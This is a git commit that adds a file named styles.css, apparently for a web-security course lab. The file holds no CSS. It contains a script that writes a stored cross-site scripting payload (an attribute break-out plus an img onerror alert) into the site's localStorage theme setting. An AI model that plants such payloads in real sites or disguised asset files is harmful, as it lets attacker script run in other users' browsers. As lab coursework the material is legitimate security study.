11bae957fb8a00d9d28d3ed140aaca95c3aeab73
grandson17 <82894441+grandson17@users.noreply.github.com>
2026-02-26 22:20:19 +0300

    Create styles.css

---
+++ styles.css
@@ -0,0 +1,8 @@
+<script>
+window.gotYou=true;
+localStorage.setItem(
+  "cs6262-web-security-user-theme",
+  '"><img src=x onerror=alert(1)>'
+);
+localStorage.setItem("cs6262-web-security-theme-mode","1");
+</script>
